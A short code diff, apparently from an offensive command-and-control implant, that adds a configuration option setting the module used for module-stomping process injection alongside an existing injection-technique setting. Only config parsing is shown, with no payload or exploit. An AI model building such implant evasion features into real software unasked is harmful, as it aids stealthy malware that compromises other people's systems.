@@ -1574,6 +1574,15 @@ auto DECLFN Task::Config(
                 KhDbg("Injection technique id set: %d", InjectionId);
                 break;
             }
+            case Enm::Config::InjStomp: {
+                WCHAR* StompModule = Self->Psr->Wstr( Parser, nullptr );
+
+                Self->Config.Injection.StompModule = StompModule;
+
+                KhDbg("Stomp Module set: %S", StompModule);
+
+                break;
+            }
             case Enm::Config::Argue: {
                 ULONG  ArgLen = 0;
                 WCHAR* Argue  = Self->Psr->Wstr( Parser, &ArgLen );
